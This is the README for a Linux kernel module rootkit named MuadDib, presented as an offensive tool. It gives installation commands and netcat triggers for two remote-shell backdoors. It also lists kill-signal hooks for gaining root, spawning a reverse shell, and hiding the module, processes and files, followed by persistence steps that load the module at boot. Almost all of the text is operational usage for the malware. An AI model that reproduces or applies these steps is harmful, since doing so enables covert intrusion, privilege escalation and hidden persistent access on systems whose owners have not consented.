# MuadDib
Linux Kernel Module (LKM) Rootkit that works with linux kernel versions 5.13 and (hopefully) below.

## Installation
Just run the Makefile and insert the module.
```
make
insmod muadDib.ko
```
## Usage
### Accept Backdoor
To remotely get a shell, send a request from a specified source port (default 1337)
```
nc xxx.xxx.xxx.xxx 22 -p 1337
```
The shell will be returned on port 42069, so have a listener for that.
### Netfilter Backdoor
To remotely get a shell, it is also possible to abuse the netfilter backdoor. Send a packet to port 7777 on
the target machine from port 6666 on the source machine:
```
nc xxx.xxx.xxx.xxx 7777 -p 6666
```
The shell will be returned on port 42069, so have a listener for that.
### Get root
When on the machine, root can be acquired via kill hook
```
kill -64 9999
```
Any PID works
### Spawn reverse shell
Also works using kill hook
```
kill -42 9999
```
### Hide muadDib LKM
Again, using kill
```
kill -63 9999
```
When hidden, running ```kill -62 9999''' will show it
### Hide Process
```
kill -44 [PID to hide]
```
### Hide and Protect files
All files containing PREFIX [default MUADDIB] are hidden and cannot be deleted. 
### Misc
There is also a mkdir and execve hook just as a POC, have not found a use yet.

### Persistence
Copy muadDib.ko to /lib/modules/$(uname -r)/kernel/drivers/ 
echo muadDib to /etc/modules
sudo depmod 

## Tested on
Ubuntu 20.04.1 x86_64 Linux 5.13.0

## Resources/References:
	https://xcellerator.github.io/
	https://github.com/xcellerator/linux_kernel_hacking
	https://github.com/ilammy/ftrace-hook
	https://github.com/h3xduck/Umbra
